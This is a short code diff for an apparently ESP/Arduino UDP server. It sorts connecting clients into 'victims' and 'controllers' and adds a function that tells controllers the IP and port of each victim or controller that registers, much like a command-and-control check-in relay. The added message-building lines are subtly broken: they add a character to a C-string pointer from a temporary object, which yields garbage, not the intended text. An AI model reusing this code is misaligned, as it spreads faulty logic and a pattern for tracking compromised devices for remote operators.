@@ -6,6 +6,19 @@ WiFiUDP socket;
 unsigned long lastCheck = 0;
 std::vector<UdpClient> clients;
 
+void sendControllers(std::string msg)
+{
+	for (auto c : clients)
+	{
+		if (!c.isVictim)
+		{
+			socket.beginPacket(c.ip, c.port);
+   	 	socket.write(msg.c_str());
+    	socket.endPacket();
+		}
+	}
+}
+
 void setup() {
   Serial.begin(9600);
 
@@ -59,8 +72,10 @@ void loop() {
 			clients.push_back(v);
 
 			socket.beginPacket(socket.remoteIP(), socket.remotePort());
-   	 	socket.write("a");
+   	 	socket.write("v");
     	socket.endPacket();
+
+			sendControllers('l' + v.ip.toString().c_str() + ';' + std::to_string(v.port));
 
 			Serial.print("v: "); 
 			Serial.print(v.ip.toString()); 
@@ -68,6 +83,30 @@ void loop() {
 			Serial.print(v.port);
 			Serial.print(", time: ");
 			Serial.println(v.time);
+		}
+		//c = new controller connection
+		else if (buffer[0] == 'c') {
+			UdpClient c;
+			c.ip = socket.remoteIP();
+			c.port = socket.remotePort()+1;
+			std::string time(buffer);
+			time.erase(time.begin());
+			c.time = stoi(time);
+			c.isVictim = false;
+			clients.push_back(c);
+
+			socket.beginPacket(socket.remoteIP(), socket.remotePort());
+   	 	socket.write("c");
+    	socket.endPacket();
+
+			sendControllers('n' + c.ip.toString().c_str() + ';' + std::to_string(c.port));
+
+			Serial.print("c: "); 
+			Serial.print(c.ip.toString()); 
+			Serial.print(":");
+			Serial.print(c.port);
+			Serial.print(", time: ");
+			Serial.println(c.time);
 		}
 
 		//flag the client as active
